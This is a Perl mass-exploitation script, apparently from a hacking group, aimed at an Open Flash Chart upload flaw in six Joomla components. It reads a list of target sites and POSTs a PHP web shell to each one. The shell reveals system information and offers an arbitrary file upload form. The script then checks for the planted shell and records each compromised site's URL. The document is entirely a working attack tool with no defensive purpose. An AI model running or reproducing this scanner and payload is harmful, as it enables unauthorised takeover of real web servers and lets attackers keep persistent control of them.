#!/usr/bin/perl
# M-A_labz
# This tool will scan for RCI in :
# com_civicrm , com_acymailing , com_jnewsletter , com_jinc , com_maianmedia , com_jnews
# http://upload.traidnt.net/upfiles/LVc77789.png
# Author : b0y h4ck3r
use HTTP::Request;
use LWP::Simple;
use HTTP::Request::Common;
use Term::ANSIColor;
use Win32::Console::ANSI;
$ua = LWP::UserAgent->new;
print color("bold red"),"[+] M-A Joomla Components RCI Exploits Scanner \n";
print color 'reset';
print color("green"),"[+] Enter File : ";
print color 'reset';
$file=<STDIN>;
chomp($file);
open (file, "<$file") || die "[-] Can't open the List of site file !";
my @file = <file>;
close file;
foreach $webs (@file) 
{
chomp $webs;
$site = $webs;
print color("green"), "[+] Scanning $site\n";
print color 'reset';
@paths=('/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php','/administrator/components/com_acymailing/inc/openflash/php-ofc-library/ofc_upload_image.php','/administrator/components/com_jnewsletter/includes/openflashchart/php-ofc-library/ofc_upload_image.php','/administrator/components/com_jinc/classes/graphics/php-ofc-library/ofc_upload_image.php','/administrator/components/com_maianmedia/utilities/charts/php-ofc-library/ofc_upload_image.php','/administrator/components/com_jnews/includes/openflashchart/php-ofc-library/ofc_upload_image.php');
foreach $path(@paths)
{
$site_vul = "http://".$site."".$path."?name=tt7.php";
$data = "php code";
$data.= ' <title>Evil Upload</title> ';
$data.= ' <h1>Evil Upload</h1> ';
$data.= '<?php ';
$data.= "echo '<b><br><br>'.php_uname().'<br></b>'; ";
$data.= 'echo \'<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">\'; ';
$data.= 'echo \'<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>\'; ';
$data.= "if( \$_POST['_upl'] == \"Upload\" ) { ";
$data.= "if(\@copy(\$_FILES['file']['tmp_name'], \$_FILES['file']['name'])) { echo '<b>Upload Succesfully !!!</b><br><br>'; } ";
$data.= "else { echo '<b>Upload Fail !!!</b><br><br>'; } ";
$data.= " } ";
$data.= "?>";
$res = $ua->request(POST $site_vul,Content_Type => 'text/plain', Content => $data);
if ($res->is_success){
print color("green"), "[+] $site is vul\n";
print color 'reset';
@vulns=('/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/tmp-upload-images/tt7.php','/administrator/components/com_acymailing/inc/openflash/tmp-upload-images/tt7.php','/administrator/components/com_jnewsletter/includes/openflashchart/tmp-upload-images/tt7.php','/administrator/components/com_jinc/classes/graphics/tmp-upload-images/tt7.php','/administrator/components/com_maianmedia/utilities/charts/tmp-upload-images/tt7.php','/administrator/components/com_jnews/includes/openflashchart/tmp-upload-images/tt7.php');
foreach $vul(@vulns)
{
$url = "http://".$site. $vul;
$request = HTTP::Request->new(GET=>$url);
$useragent = LWP::UserAgent->new();
$response = $useragent->request($request);
if ($response->content=~m/<title>Evil Upload<\/title>/g){
print color("green"), "[+] Found => $url\n\n";
print color 'reset';
open(BEN,">>result-$site.txt");
print BEN "$url\n";
close(BEN);
}else{
print "[-] Not Found \n";
}
}
}
}
}